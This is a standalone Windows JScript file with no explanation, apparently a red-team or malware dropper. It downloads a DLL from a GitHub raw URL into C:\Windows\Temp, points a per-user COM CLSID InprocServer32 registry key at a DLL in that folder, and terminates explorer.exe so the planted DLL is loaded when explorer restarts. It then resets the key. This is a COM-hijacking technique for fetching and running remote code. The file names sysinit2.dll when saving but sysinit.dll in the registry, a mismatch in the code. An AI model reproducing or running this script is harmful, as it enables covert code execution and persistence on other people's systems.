var http_obj = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
var stream_obj = new ActiveXObject("ADODB.Stream");
var o = new ActiveXObject("WScript.Shell")
var URL = "https://github.com/RT-KT/2DLLs/raw/master/magic/MixedModeAsm.dll?a=123";
var FILENAME = "C:\\Windows\\Temp\\sysinit2.dll";
http_obj.open("GET", URL, false)
http_obj.send();
stream_obj.type = 1;
stream_obj.open();
stream_obj.write(http_obj.responseBody);
stream_obj.savetofile(FILENAME, 2);
var process = GetObject("winmgmts:\\\\.\\root\\cimv2")
var colItems = process.ExecQuery("Select * From Win32_Process where name='explorer.exe'")
var objItem = new Enumerator(colItems);
var explorerProc = objItem.item();
o.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{660b90c8-73a9-4b58-8cae-355b7f55341b}\\InprocServer32\\","")
o.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{660b90c8-73a9-4b58-8cae-355b7f55341b}\\InprocServer32\\","C:\\Windows\\Temp\\sysinit.dll" ,"REG_SZ")
explorerProc.Terminate()
WScript.Sleep(3000)
o.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{660b90c8-73a9-4b58-8cae-355b7f55341b}\\InprocServer32\\","C:\\Windows\\System32\\appresolver.dll" ,"REG_SZ")
